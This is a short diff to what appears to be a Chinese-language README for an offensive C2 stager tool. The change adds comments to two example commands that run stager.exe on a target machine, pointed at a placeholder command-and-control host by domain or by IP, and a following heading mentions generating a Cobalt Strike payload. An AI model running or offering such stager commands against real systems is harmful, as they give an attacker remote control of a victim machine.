@@ -103,8 +103,8 @@ int main(int argc, char *argv[])
 ```
 stager生成之后，上传至目标机器并执行，执行方式如：stager.exe c2_hostname port  
 ```
-stager.exe www.xxxxxx.com 53
-stager.exe 8.8.x.x 8080
+stager.exe www.xxxxxx.com 53    //使用域名方式
+stager.exe 8.8.x.x 8080         //使用IP方式
 ```
 
 ##### 2、生成CS payload并在C2服务器启动TCP Server
